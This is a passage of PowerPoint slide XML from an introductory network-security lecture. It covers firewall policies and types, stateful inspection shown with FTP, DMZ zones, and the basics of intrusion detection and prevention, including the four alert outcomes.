              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Your reputation</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="9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Firewalls Types of Protection</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72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They can block unwanted traffic.</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They can direct incoming traffic to more trustworthy internal systems.</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They can log traffic to and from the private network.</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Firewall Design Policy</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Permit</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> any service unless it is expressly denied</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Deny</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> any service unless it is expressly permitted</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="9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Firewall Types</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73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Personal firewalls</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Static packet filtering</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Dynamic packet filtering</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Proxy</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Personal Firewalls</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="735"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Available for personal computers</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Offer protection for individual systems</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Examples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Zone alarm (Windows)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Black Ice (Windows)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ipchains (Linux)</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iptables (Linux)</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Static Packet Filtering</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73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Controls traffic by using information stored within packet headers</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As packets are received by the filtering device, the attributes of the data stored within the packet are compared against the access control list and the traffic is either allowed or denied</a:t>
            </a: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Information used</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Source and Destination IP address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Source and Destination port number</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Static Packet Filtering</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73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Not intelligent filtering device</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Offer little protection against advanced types of attacks</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Many routers have the ability to perform static packet filtering (</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0000ff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Cisco Routers use Access-Control lists</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>) </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Dynamic Packet Filtering</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Stateful Inspection</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Maintain a connection table (</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0000ff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>state table</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>) in order to monitor the state of a communication session</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>More intelligent</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Example: FTP Traffic passing by Firewall</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74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FTP utilizes two ports</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Data port 20 (on active may be random port specified in request) </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Command port 21</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 </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="744" name="Picture 3" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352680" y="3419640"/>
            <a:ext cx="3037680" cy="2675880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="745" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4267080" y="6095880"/>
            <a:ext cx="144720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Active FTP</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Stateful Inspection with FTP</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="747" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2554200"/>
            <a:ext cx="7771680" cy="2739600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="748" name="CustomShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533520" y="5105520"/>
            <a:ext cx="144720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FTP Client</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="749" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5181480"/>
            <a:ext cx="144720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FTP Server</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Dynamic Packet Filtering Limitations</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75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Cannot make filtering based on the payload (data)</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No prevention of application layer attacks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Not all protocols are stateful (UDP, ICMP)</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Proxy</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75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Application gateway or forwarder</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2500" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Maintains complete TCP connection state and sequencing through 2 connections</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="25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Session user to proxy</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Proxy to destination server</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Process table manages to keep the connections straight </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2500" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Address translation built-in </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2500" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2500" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Must change the application (Web browser) to include the proxy settings </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="25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200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>DMZ</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Zone</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="755"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The De-Militarized Zone, or DMZ, is an expression that comes from the Korean War.</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a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>a portion of your network which, although under your control, is outside your heaviest security</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>”</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Machines placed in the DMZ usually </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="ffffff"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>offer services to the public</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>, like Web services, domain name services (DNS), and FTP services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TextShape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7771680" cy="1469160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>IDS/IPS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="757" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="3581280"/>
            <a:ext cx="6400080" cy="175176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Intrusion Detection and Prevention</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75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Host-based</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HIDS, HIPS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Network-based</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NIDS, NIPS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Intrusion Detection Systems</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76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An IDS is any combination of hardware &amp; software that monitors a system or network for malicious activity.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Examples of IDSs in real life</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Car alarms</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Fire detectors</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House alarms</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Surveillance systems</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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IDS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76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Reports attacks against monitored systems/networks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Mature Technology that has significant utilization</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Not a replacement for firewalls, strong policies, system hardening, timely patching, and other DiD techniques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Not a low maintenance tool</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Not an inexpensive tool</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Not a silver bullet</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105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NIDS Overview</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="765"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Deployed as a passive sensor at network aggregation points</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Captures traffic like a sniffer</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Detects EOI on the network</a:t>
            </a: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Uses signature, anomaly, or application/protocol analysis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IDS Operation </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76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Captures all traffic passing in a network</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Compares the packet to a number of known packet attacks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If an attack is detected an action is taken</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Log suspicious events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Save raw packet captures</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Send an alert (e-mail, message to network management system)</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Reset connection</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Interact with a firewall to modify the rules and block the attacking host</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IDS Parts</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76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Engine</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Capture and analyze the traffic</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Console</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Manage engine and run reports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IDS Alerts</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77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Alerts are generated from Events of Intrest EOI</a:t>
            </a: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4 types of events:</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True Positive </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1200240" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Attacks detected as attacks</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True Negative</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1200240" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Legitimate detected as legitimate </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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False Positive</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1200240" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Legitimate detected as attacks</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False Negative</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1200240" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Attacks detected as legitimate</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="20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Deep Vs Shallow Inspection</a:t>
            </a:r>
